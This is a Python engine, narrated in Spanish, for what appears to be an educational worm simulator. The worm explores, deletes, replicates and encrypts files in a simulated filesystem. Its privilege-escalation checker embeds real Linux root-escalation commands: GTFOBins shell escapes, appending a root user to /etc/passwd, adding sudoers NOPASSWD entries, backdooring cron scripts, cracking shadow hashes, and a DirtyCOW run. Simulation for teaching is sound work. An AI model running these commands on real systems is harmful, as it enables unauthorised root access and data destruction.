from __future__ import annotations
import time
from dataclasses import dataclass, field
from filesystem import FileSystem, FileNode, encrypt_content, decrypt_content, generate_key


@dataclass
class PrivescFinding:
    check: str
    severity: str        # CRITICO / ALTO / MEDIO / INFO
    title: str
    detail: str
    path: str
    exploit_hint: str


@dataclass
class CommandResult:
    success: bool
    data: dict
    narration: str
    needs_permission: bool = False
    permission_prompt: str = ""
    action_tag: str = ""


@dataclass
class WormState:
    current_node: FileNode
    visited_paths: set[str] = field(default_factory=set)
    replicated_at: list[str] = field(default_factory=list)
    deleted_files: list[str] = field(default_factory=list)
    edited_files: list[str] = field(default_factory=list)
    start_time: float = field(default_factory=time.monotonic)


class WormEngine:
    def __init__(self, fs: FileSystem):
        self.fs = fs
        start = fs.get_node("/home/usuario") or fs.root
        self.state = WormState(current_node=start)
        self.state.visited_paths.add(fs.get_path(start))

    def current_path(self) -> str:
        return self.fs.get_path(self.state.current_node)

    def _resolve(self, target: str) -> FileNode | None:
        if target == "..":
            return self.state.current_node.parent
        if target == ".":
            return self.state.current_node
        if target.startswith("/"):
            return self.fs.get_node(target)
        cur = self.state.current_node
        if target in cur.children:
            return cur.children[target]
        # allow partial absolute from root
        return self.fs.get_node("/" + target)

    # --- Non-destructive commands ---

    def cmd_ls(self) -> CommandResult:
        node = self.state.current_node
        children = self.fs.list_children(node)
        n_dirs = sum(1 for c in children if c.is_dir)
        n_files = sum(1 for c in children if not c.is_dir)
        n_sensitive = sum(1 for c in children if c.is_sensitive)
        if n_sensitive:
            narr = (
                f"Estoy en '{self.current_path()}'. Encuentro {n_dirs} directorio(s) y {n_files} archivo(s). "
                f"ALERTA: detecto {n_sensitive} archivo(s) sensible(s) en este nivel. "
                f"Usa 'scan' para buscar en profundidad o 'delete <nombre>' para eliminar uno."
            )
        else:
            narr = (
                f"Directorio '{self.current_path()}' inspeccionado: {n_dirs} dirs, {n_files} archivos. "
                f"Sin datos sensibles a la vista. Puedo explorar subdirectorios con 'cd' o escanear con 'scan'."
            )
        return CommandResult(success=True, data={"nodes": children, "path": self.current_path()},
                             narration=narr, action_tag="ls")

    def cmd_cd(self, target: str) -> CommandResult:
        if not target:
            return CommandResult(success=False, data={}, narration="Indica un directorio destino.", action_tag="cd")
        node = self._resolve(target)
        if node is None:
            return CommandResult(success=False, data={},
                                 narration=f"No encuentro '{target}' desde aqui. Usa 'ls' para ver opciones.",
                                 action_tag="cd")
        if not node.is_dir:
            return CommandResult(success=False, data={},
                                 narration=f"'{target}' es un archivo, no un directorio.", action_tag="cd")
        self.state.current_node = node
        path = self.fs.get_path(node)
        self.state.visited_paths.add(path)
        children = self.fs.list_children(node)
        n_sensitive = sum(1 for c in children if c.is_sensitive)
        if n_sensitive:
            narr = (
                f"Me he movido a '{path}'. "
                f"Interesante: ya detecto {n_sensitive} archivo(s) sensible(s) en este directorio. "
                f"Usa 'ls' para verlos o 'scan' para buscar en profundidad."
            )
        else:
            narr = f"Ahora estoy en '{path}'. Sin archivos sensibles detectados de inmediato. Ejecuta 'ls' para explorar."
        return CommandResult(success=True, data={"path": path}, narration=narr, action_tag="cd")

    def cmd_scan(self) -> CommandResult:
        results = self.fs.scan_sensitive(self.state.current_node)
        if results:
            paths_str = ", ".join(p for _, p in results[:5])
            extra = f" (y {len(results)-5} mas)" if len(results) > 5 else ""
            narr = (
                f"Escaneo completado desde '{self.current_path()}'. "
                f"He encontrado {len(results)} archivo(s) sensible(s): {paths_str}{extra}. "
                f"Puedo eliminarlos con 'delete', modificarlos con 'edit', o moverme a su ubicacion con 'cd'."
            )
        else:
            narr = (
                f"Escaneo completado desde '{self.current_path()}'. "
                f"No se encontraron archivos sensibles en este subarbol. "
                f"Prueba desde un directorio superior o usa 'cd' para cambiar de zona."
            )
        return CommandResult(success=True, data={"results": results},
                             narration=narr, action_tag="scan")

    def cmd_tree(self) -> CommandResult:
        narr = f"Mostrando arbol de directorios desde '{self.current_path()}'."
        return CommandResult(success=True,
                             data={"root": self.state.current_node, "base_path": self.current_path()},
                             narration=narr, action_tag="tree")

    def cmd_status(self) -> CommandResult:
        elapsed = time.monotonic() - self.state.start_time
        narr = (
            f"He visitado {len(self.state.visited_paths)} ubicacion(es), "
            f"eliminado {len(self.state.deleted_files)} archivo(s), "
            f"modificado {len(self.state.edited_files)} archivo(s), "
            f"y me he replicado en {len(self.state.replicated_at)} lugar(es). "
            f"Tiempo activo: {int(elapsed)}s."
        )
        return CommandResult(success=True,
                             data={"state": self.state, "elapsed": elapsed},
                             narration=narr, action_tag="status")

    # --- Destructive commands: plan phase (no mutation) ---

    def plan_delete(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None or node.parent is None:
            return CommandResult(success=False, data={},
                                 narration=f"No encuentro '{name}' en el directorio actual.",
                                 action_tag="delete")
        if node.is_dir:
            return CommandResult(success=False, data={},
                                 narration=f"'{name}' es un directorio. Solo puedo eliminar archivos.",
                                 action_tag="delete")
        sensitive_label = " [SENSIBLE]" if node.is_sensitive else ""
        narr = (
            f"Tengo en la mira '{name}'{sensitive_label} "
            f"({node.size} bytes) en '{self.current_path()}'. "
            f"Con tu autorizacion, lo borrare permanentemente del sistema simulado."
        )
        return CommandResult(
            success=True,
            data={"target_name": name, "node": node},
            narration=narr,
            needs_permission=True,
            permission_prompt=f"Eliminar '{name}'{sensitive_label} del sistema simulado? [s/n]",
            action_tag="delete",
        )

    def run_delete(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None or node.is_dir:
            return CommandResult(success=False, data={}, narration="El archivo ya no existe o es un directorio.",
                                 action_tag="delete")
        path = self.fs.get_path(node)
        self.fs.remove_node(node)
        self.state.deleted_files.append(path)
        narr = (
            f"Archivo '{name}' eliminado de '{self.fs.get_path(self.state.current_node)}'. "
            f"He borrado toda evidencia de su existencia. Total eliminados: {len(self.state.deleted_files)}."
        )
        return CommandResult(success=True, data={"deleted_path": path}, narration=narr, action_tag="delete")

    def plan_edit(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None:
            return CommandResult(success=False, data={},
                                 narration=f"No encuentro '{name}' en el directorio actual.",
                                 action_tag="edit")
        if node.is_dir:
            return CommandResult(success=False, data={},
                                 narration=f"'{name}' es un directorio, no un archivo.",
                                 action_tag="edit")
        preview = node.content[:120].replace("\n", "\\n")
        narr = (
            f"Tengo acceso al archivo '{name}' ({node.size} bytes). "
            f"Contenido actual: {preview}... "
            f"Puedo sobreescribir su contenido completamente con lo que tu indiques."
        )
        return CommandResult(
            success=True,
            data={"node": node, "name": name},
            narration=narr,
            needs_permission=True,
            permission_prompt=f"Modificar el contenido de '{name}'? [s/n]",
            action_tag="edit",
        )

    def run_edit(self, name: str, new_content: str) -> CommandResult:
        node = self._resolve(name)
        if node is None or node.is_dir:
            return CommandResult(success=False, data={}, narration="Archivo no encontrado.", action_tag="edit")
        path = self.fs.get_path(node)
        self.fs.edit_file(node, new_content)
        if path not in self.state.edited_files:
            self.state.edited_files.append(path)
        narr = (
            f"Archivo '{name}' modificado. Nuevo tamano: {node.size} bytes. "
            f"El contenido ha sido reemplazado segun tus instrucciones."
        )
        return CommandResult(success=True, data={"edited_path": path}, narration=narr, action_tag="edit")

    def plan_replicate(self, target_path: str) -> CommandResult:
        target = self._resolve(target_path)
        if target is None or not target.is_dir:
            return CommandResult(success=False, data={},
                                 narration=f"'{target_path}' no es un directorio valido o no existe.",
                                 action_tag="replicate")
        dest_path = self.fs.get_path(target)
        if "worm.py" in target.children:
            return CommandResult(success=False, data={},
                                 narration=f"Ya existo en '{dest_path}'. No necesito replicarme de nuevo alli.",
                                 action_tag="replicate")
        narr = (
            f"Identifico '{dest_path}' como objetivo de replicacion. "
            f"Plantare una copia de mi codigo (worm.py) en ese directorio. "
            f"Asi aseguro mi persistencia incluso si me borran de '{self.current_path()}'."
        )
        return CommandResult(
            success=True,
            data={"target": target, "dest_path": dest_path},
            narration=narr,
            needs_permission=True,
            permission_prompt=f"Plantar copia del gusano en '{dest_path}'? [s/n]",
            action_tag="replicate",
        )

    def run_replicate(self, target_path: str) -> CommandResult:
        target = self._resolve(target_path)
        if target is None or not target.is_dir:
            return CommandResult(success=False, data={}, narration="Directorio destino no encontrado.",
                                 action_tag="replicate")
        dest_path = self.fs.get_path(target)
        if "worm.py" in target.children:
            return CommandResult(success=False, data={},
                                 narration=f"Ya existo en '{dest_path}'.", action_tag="replicate")
        worm_content = (
            "# Gusano IA - Simulador educativo\n"
            "# Este archivo representa una copia replicada del gusano.\n"
            f"# Origen: {self.current_path()}\n"
            f"# Destino: {dest_path}\n"
        )
        from filesystem import FileNode
        replica = FileNode(
            name="worm.py", is_dir=False,
            size=len(worm_content.encode()),
            is_sensitive=False,
            content=worm_content,
        )
        self.fs.add_node(target, replica)
        self.state.replicated_at.append(dest_path)
        narr = (
            f"Replicacion exitosa en '{dest_path}'. "
            f"Ahora existo en {len(self.state.replicated_at)} ubicacion(es) adicional(es). "
            f"Mi propagacion continua."
        )
        return CommandResult(success=True, data={"dest_path": dest_path}, narration=narr, action_tag="replicate")

    # --- Encrypt / Decrypt ---

    def plan_encrypt(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None:
            return CommandResult(success=False, data={},
                                 narration=f"No encuentro '{name}' en el directorio actual.",
                                 action_tag="encrypt")
        if node.is_dir:
            files = self._collect_files(node)
            already = sum(1 for f in files if f.is_encrypted)
            pending = len(files) - already
            narr = (
                f"Directorio '{name}' contiene {len(files)} archivo(s) "
                f"({already} ya encriptados, {pending} pendientes). "
                f"Voy a encriptar cada archivo con una clave unica de 128 bits. "
                f"Cada clave se mostrara UNA SOLA VEZ — no hay forma de recuperarlas despues."
            )
            return CommandResult(
                success=True,
                data={"name": name, "node": node, "is_dir": True, "pending": pending},
                narration=narr,
                needs_permission=True,
                permission_prompt=f"Encriptar {pending} archivo(s) en '{name}' con claves individuales? [s/n]",
                action_tag="encrypt",
            )
        sensitive_label = " [SENSIBLE]" if node.is_sensitive else ""
        already_enc = " [YA ENCRIPTADO — se re-encriptara]" if node.is_encrypted else ""
        narr = (
            f"Tengo en la mira '{name}'{sensitive_label}{already_enc} ({node.size} bytes). "
            f"Voy a encriptar su contenido con una clave de 128 bits generada aleatoriamente. "
            f"La clave se mostrara UNA SOLA VEZ — si la pierdes, el archivo no puede recuperarse."
        )
        return CommandResult(
            success=True,
            data={"name": name, "node": node, "is_dir": False},
            narration=narr,
            needs_permission=True,
            permission_prompt=f"Encriptar '{name}'{sensitive_label}{already_enc}? La clave solo se muestra una vez. [s/n]",
            action_tag="encrypt",
        )

    def _collect_files(self, node: FileNode) -> list[FileNode]:
        result: list[FileNode] = []
        stack = [node]
        while stack:
            n = stack.pop()
            if n.is_dir:
                stack.extend(n.children.values())
            else:
                result.append(n)
        return result

    def _encrypt_single(self, node: FileNode) -> str:
        key = generate_key()
        node.content = encrypt_content(node.content, key)
        node.is_encrypted = True
        node.size = len(node.content.encode())
        return key

    def run_encrypt(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None:
            return CommandResult(success=False, data={},
                                 narration="Archivo o directorio no encontrado.", action_tag="encrypt")
        if node.is_dir:
            files = self._collect_files(node)
            encrypted_entries: list[dict] = []
            for f in files:
                key = self._encrypt_single(f)
                encrypted_entries.append({"name": f.name, "path": self.fs.get_path(f), "key": key})
            narr = (
                f"Directorio '{name}' procesado: {len(encrypted_entries)} archivo(s) encriptados. "
                f"Cada archivo tiene una clave unica — se muestran a continuacion."
            )
            return CommandResult(success=True,
                                 data={"name": name, "entries": encrypted_entries, "is_dir": True},
                                 narration=narr, action_tag="encrypt")
        key = self._encrypt_single(node)
        path = self.fs.get_path(node)
        narr = (
            f"Archivo '{name}' encriptado exitosamente. "
            f"Contenido reemplazado por {node.size} bytes de datos cifrados. "
            f"Sin la clave correcta, el contenido es irrecuperable."
        )
        return CommandResult(
            success=True,
            data={"name": name, "path": path, "key": key, "is_dir": False},
            narration=narr,
            action_tag="encrypt",
        )

    def plan_decrypt(self, name: str) -> CommandResult:
        node = self._resolve(name)
        if node is None:
            return CommandResult(success=False, data={},
                                 narration=f"No encuentro '{name}' en el directorio actual.",
                                 action_tag="decrypt")
        if node.is_dir:
            return CommandResult(success=False, data={},
                                 narration=f"'{name}' es un directorio.", action_tag="decrypt")
        if not node.is_encrypted:
            return CommandResult(success=False, data={},
                                 narration=f"'{name}' no esta encriptado.", action_tag="decrypt")
        narr = (
            f"'{name}' esta encriptado. Para restaurar su contenido necesito la clave de 32 caracteres "
            f"que se genero en el momento de la encriptacion. Introduce la clave cuando se te solicite."
        )
        return CommandResult(success=True, data={"name": name, "node": node},
                             narration=narr, action_tag="decrypt")

    def run_decrypt(self, name: str, key: str) -> CommandResult:
        node = self._resolve(name)
        if node is None or node.is_dir or not node.is_encrypted:
            return CommandResult(success=False, data={},
                                 narration="Archivo no encontrado o no esta encriptado.", action_tag="decrypt")
        success, result = decrypt_content(node.content, key)
        if not success:
            return CommandResult(success=False, data={},
                                 narration=f"Desencriptado fallido: {result}", action_tag="decrypt")
        node.content = result
        node.is_encrypted = False
        node.size = len(result.encode())
        path = self.fs.get_path(node)
        narr = (
            f"Archivo '{name}' desencriptado correctamente. "
            f"Contenido restaurado: {node.size} bytes legibles."
        )
        return CommandResult(success=True, data={"name": name, "path": path},
                             narration=narr, action_tag="decrypt")

    # --- Privilege Escalation ---

    def cmd_privesc(self) -> CommandResult:
        findings: list[PrivescFinding] = []
        findings += self._check_suid_binaries()
        findings += self._check_sudo_nopasswd()
        findings += self._check_writable_cron()
        findings += self._check_writable_sensitive_files()
        findings += self._check_shadow_readable()
        findings += self._check_ssh_keys()
        findings += self._check_kernel_version()
        findings += self._check_path_hijack()

        order = {"CRITICO": 0, "ALTO": 1, "MEDIO": 2, "INFO": 3}
        findings.sort(key=lambda f: order.get(f.severity, 9))

        n_critico = sum(1 for f in findings if f.severity == "CRITICO")
        n_alto = sum(1 for f in findings if f.severity == "ALTO")

        if n_critico:
            narr = (
                f"ALERTA: {n_critico} vector(es) CRITICO(S) de escalada de privilegios detectados. "
                f"El sistema tiene configuraciones gravemente inseguras. "
                f"Con los vectores encontrados, un atacante podria obtener root en segundos."
            )
        elif n_alto:
            narr = (
                f"Se encontraron {n_alto} vector(es) de severidad ALTA. "
                f"El sistema es vulnerable a escalada de privilegios con pasos adicionales."
            )
        else:
            narr = f"Scan completado. {len(findings)} hallazgo(s) informativos. Sin vectores criticos detectados."

        return CommandResult(
            success=True,
            data={"findings": findings},
            narration=narr,
            action_tag="privesc",
        )

    # --- Private checks ---

    def _all_files_recursive(self, node: FileNode | None = None) -> list[FileNode]:
        node = node or self.fs.root
        result: list[FileNode] = []
        stack = [node]
        while stack:
            n = stack.pop()
            if not n.is_dir:
                result.append(n)
            else:
                stack.extend(n.children.values())
        return result

    _GTFOBINS: dict[str, str] = {
        "python3.10": "python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "python3":    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "python":     "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "find":       "find /etc/passwd -exec /bin/bash -p \\;",
        "nmap":       "nmap --interactive  →  !sh",
        "vim.basic":  "vim -c ':!/bin/bash'",
        "vim":        "vim -c ':!/bin/bash'",
        "bash":       "bash -p",
        "cp":         "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p",
        "less":       "less /etc/passwd  →  !/bin/bash",
        "more":       "more /etc/passwd  →  !/bin/bash",
        "awk":        "awk 'BEGIN {system(\"/bin/bash\")}'",
        "perl":       "perl -e 'exec \"/bin/bash\";'",
        "ruby":       "ruby -e 'exec \"/bin/bash\"'",
        "tee":        "echo 'usuario ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers",
    }

    def _check_suid_binaries(self) -> list[PrivescFinding]:
        findings = []
        for f in self._all_files_recursive():
            if f.suid and f.owner == "root":
                path = self.fs.get_path(f)
                hint = self._GTFOBINS.get(f.name,
                    f"Revisar GTFOBins: https://gtfobins.github.io/gtfobins/{f.name}/")
                findings.append(PrivescFinding(
                    check="SUID Binary",
                    severity="CRITICO",
                    title=f"SUID bit activo en binario root: {f.name}",
                    detail=(
                        f"El binario '{f.name}' tiene el bit SUID activado y pertenece a root. "
                        f"Cualquier usuario puede ejecutarlo con privilegios de root. "
                        f"Permisos: {f.mode}  Propietario: {f.owner}"
                    ),
                    path=path,
                    exploit_hint=hint,
                ))
        return findings

    def _check_sudo_nopasswd(self) -> list[PrivescFinding]:
        findings = []
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            if ("sudoers" in path or path.startswith("/etc/sudoers")) and "NOPASSWD" in f.content:
                lines = [l.strip() for l in f.content.splitlines() if "NOPASSWD" in l and not l.startswith("#")]
                for line in lines:
                    binary = line.split("NOPASSWD:")[-1].strip().split()[-1] if "NOPASSWD:" in line else "desconocido"
                    bin_name = binary.split("/")[-1]
                    hint = self._GTFOBINS.get(bin_name, f"sudo {binary} [opciones segun GTFOBins]")
                    findings.append(PrivescFinding(
                        check="Sudo NOPASSWD",
                        severity="CRITICO",
                        title=f"sudo NOPASSWD para {binary}",
                        detail=(
                            f"El usuario actual puede ejecutar '{binary}' como root sin contrasena. "
                            f"Entrada en sudoers: {line}"
                        ),
                        path=path,
                        exploit_hint=f"sudo {hint}",
                    ))
        return findings

    def _check_writable_cron(self) -> list[PrivescFinding]:
        findings = []
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            is_cron_path = "/cron" in path or "crontab" in path
            world_writable = f.mode.endswith("rw-") or f.mode.endswith("rwx") or "rwxrwxrwx" in f.mode
            if is_cron_path and world_writable and f.owner == "root":
                findings.append(PrivescFinding(
                    check="Cron Job Writable",
                    severity="CRITICO",
                    title=f"Cron job escribible por cualquier usuario: {f.name}",
                    detail=(
                        f"El script '{path}' pertenece a root (se ejecuta como root) "
                        f"pero cualquier usuario puede modificarlo. "
                        f"Permisos actuales: {f.mode}"
                    ),
                    path=path,
                    exploit_hint=(
                        f"echo '#!/bin/bash\\nchmod +s /bin/bash' >> {path} "
                        f"# Esperar ejecucion del cron  →  /bin/bash -p"
                    ),
                ))
            elif is_cron_path and world_writable:
                findings.append(PrivescFinding(
                    check="Cron Job Writable",
                    severity="ALTO",
                    title=f"Script de cron escribible: {f.name}",
                    detail=f"Script '{path}' con permisos {f.mode} puede ser modificado.",
                    path=path,
                    exploit_hint=f"echo 'chmod +s /bin/bash' >> {path}",
                ))
        # Also check writable scripts that might be called by root cron
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            world_writable = "rwxrwxrwx" in f.mode or (len(f.mode) >= 9 and f.mode[6] == "w")
            if (f.name.endswith(".sh") or f.name.endswith(".py")) and world_writable and f.owner == "root":
                if "/cron" not in path:
                    findings.append(PrivescFinding(
                        check="Writable Root Script",
                        severity="ALTO",
                        title=f"Script root escribible: {f.name}",
                        detail=(
                            f"'{path}' pertenece a root y tiene permisos {f.mode}. "
                            f"Si es llamado por un proceso privilegiado, permite ejecucion como root."
                        ),
                        path=path,
                        exploit_hint=f"echo 'chmod +s /bin/bash' >> {path}  # Si es llamado por root/cron",
                    ))
        return findings

    def _check_writable_sensitive_files(self) -> list[PrivescFinding]:
        findings = []
        targets = {
            "/etc/passwd":  (
                "CRITICO",
                "Agregar usuario root sin contrasena",
                "echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned",
            ),
            "/etc/sudoers": (
                "CRITICO",
                "Agregar entrada NOPASSWD para todos",
                "echo 'usuario ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            ),
        }
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            if path not in targets:
                continue
            world_writable = len(f.mode) >= 9 and f.mode[6] in ("w",)
            group_writable = len(f.mode) >= 6 and f.mode[3] in ("w",)
            if world_writable or (group_writable and f.owner == "root"):
                sev, action, hint = targets[path]
                findings.append(PrivescFinding(
                    check="Writable Critical File",
                    severity=sev,
                    title=f"{path} es escribible por usuarios sin privilegios",
                    detail=(
                        f"Permisos actuales: {f.mode}  Propietario: {f.owner}. "
                        f"Accion posible: {action}."
                    ),
                    path=path,
                    exploit_hint=hint,
                ))
        return findings

    def _check_shadow_readable(self) -> list[PrivescFinding]:
        findings = []
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            if path == "/etc/shadow" and "$" in f.content:
                world_readable = len(f.mode) >= 9 and f.mode[7] == "r"
                if world_readable:
                    findings.append(PrivescFinding(
                        check="Shadow Readable",
                        severity="ALTO",
                        title="/etc/shadow legible por cualquier usuario",
                        detail=(
                            f"El archivo /etc/shadow contiene hashes de contrasenas y tiene "
                            f"permisos {f.mode}. Cualquier usuario puede leerlo y atacar los hashes offline."
                        ),
                        path=path,
                        exploit_hint=(
                            "unshadow /etc/passwd /etc/shadow > hashes.txt && "
                            "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"
                        ),
                    ))
        return findings

    def _check_ssh_keys(self) -> list[PrivescFinding]:
        findings = []
        for f in self._all_files_recursive():
            path = self.fs.get_path(f)
            if ("PRIVATE KEY" in f.content or "BEGIN RSA" in f.content) and "id_rsa" in f.name:
                findings.append(PrivescFinding(
                    check="SSH Private Key",
                    severity="ALTO",
                    title=f"Clave privada SSH accesible: {f.name}",
                    detail=(
                        f"Clave privada encontrada en '{path}'. "
                        f"Si corresponde a un usuario con privilegios (root u otro), "
                        f"permite acceso directo sin contrasena."
                    ),
                    path=path,
                    exploit_hint=(
                        f"chmod 600 {path} && "
                        f"ssh -i {path} root@<target>  # o usuario con sudo"
                    ),
                ))
        return findings

    def _check_kernel_version(self) -> list[PrivescFinding]:
        proc_version = self.fs.get_node("/proc/version")
        if not proc_version:
            return []
        content = proc_version.content
        findings = []
        kernel_vulns = [
            ("4.4.0-116", "CVE-2016-5195", "DirtyCOW",
             "CRITICO",
             "Race condition en copy-on-write permite escritura en archivos de solo lectura. "
             "Explotable para modificar /etc/passwd o inyectar en procesos privilegiados.",
             "gcc -pthread dirtycow.c -o dirtycow -lcrypt && ./dirtycow /etc/passwd "
             "'root:NEWPASS:0:0:root:/root:/bin/bash'"),
            ("3.13", "CVE-2015-1328", "overlayfs",
             "CRITICO",
             "Fallo en overlayfs permite crear archivos SUID en directorios montados por usuario.",
             "./ofs  # exploit publico en exploit-db 37292"),
            ("2.6", "CVE-2010-3904", "RDS",
             "CRITICO",
             "Buffer overflow en modulo RDS permite escalada local a root.",
             "./rds-privesc  # exploit publico"),
        ]
        for kver, cve, name, sev, detail, hint in kernel_vulns:
            if kver in content:
                findings.append(PrivescFinding(
                    check="Kernel Exploit",
                    severity=sev,
                    title=f"Kernel vulnerable a {name} ({cve})",
                    detail=detail,
                    path="/proc/version",
                    exploit_hint=hint,
                ))
                break
        if not findings:
            findings.append(PrivescFinding(
                check="Kernel Version",
                severity="INFO",
                title=f"Version de kernel registrada",
                detail=content.strip()[:120],
                path="/proc/version",
                exploit_hint="Buscar CVEs en: https://www.cvedetails.com/",
            ))
        return findings

    def _check_path_hijack(self) -> list[PrivescFinding]:
        findings = []
        tmp_node = self.fs.get_node("/tmp")
        if tmp_node and "w" in tmp_node.mode:
            findings.append(PrivescFinding(
                check="PATH Hijacking",
                severity="MEDIO",
                title="/tmp es escribible y podria estar en PATH de procesos privilegiados",
                detail=(
                    "Si algun script ejecutado como root llama a un binario sin ruta absoluta "
                    "(ej: 'ls', 'cat', 'id'), es posible sustituirlo con uno propio en /tmp "
                    "si /tmp aparece antes en el PATH del proceso privilegiado."
                ),
                path="/tmp",
                exploit_hint=(
                    "echo '#!/bin/bash\\nbash -p' > /tmp/ls && "
                    "chmod +x /tmp/ls && "
                    "export PATH=/tmp:$PATH  # Solo efectivo si cron/script no usa rutas absolutas"
                ),
            ))
        return findings
